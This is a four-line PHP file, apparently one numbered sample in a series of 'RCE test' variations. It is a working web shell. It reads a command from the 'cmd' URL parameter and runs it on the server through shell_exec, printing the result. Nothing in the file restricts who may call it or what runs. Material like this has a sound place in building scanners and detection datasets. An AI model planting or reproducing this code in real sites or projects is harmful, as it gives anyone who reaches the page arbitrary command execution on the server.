<?php
// RCE test variation #1461
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>